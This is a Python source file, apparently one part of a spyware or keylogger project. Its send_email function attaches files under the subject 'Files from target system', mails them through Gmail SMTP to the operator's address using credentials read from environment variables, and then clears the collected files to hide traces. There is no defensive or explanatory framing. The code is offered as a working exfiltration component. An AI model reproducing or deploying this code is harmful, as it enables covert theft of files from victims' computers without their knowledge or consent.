import sys, os
import smtplib, threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

sys.path.insert(0, "./services")
from services import connection, clearContent

# email setup

def send_email(filePath):
    sender_mail = os.getenv('EMAIL')
    reciever_mail = os.getenv('EMAIL')
    message = MIMEMultipart()
    message['From'] = sender_mail
    message['To'] = reciever_mail
    message['Subject'] = "Files from target system "
    mail_content = '''
    This email contains the content of the file from the system
    '''

    message.attach(MIMEText(mail_content, 'plain'))
    for file in filePath:
        print(file)
        attach_file_name = file
        attach_file = open(attach_file_name, 'rb')
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Decomposition',
                        'attachment', filename=attach_file_name)
        message.attach(payload)

        if connection.internet_conn():
            password = os.getenv('PASSWORD')
            smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
            smtpObj.starttls()
            print(smtpObj, sender_mail, password)
            smtpObj.login(sender_mail, password)
            text = message.as_string()
            smtpObj.sendmail(sender_mail, reciever_mail, text)
            smtpObj.quit()
            clearContent.clearContent(filePath)
            print('email sent successfully')
        else:
            print(";enetered")
            clearContent.clearContent(filePath)
            
    
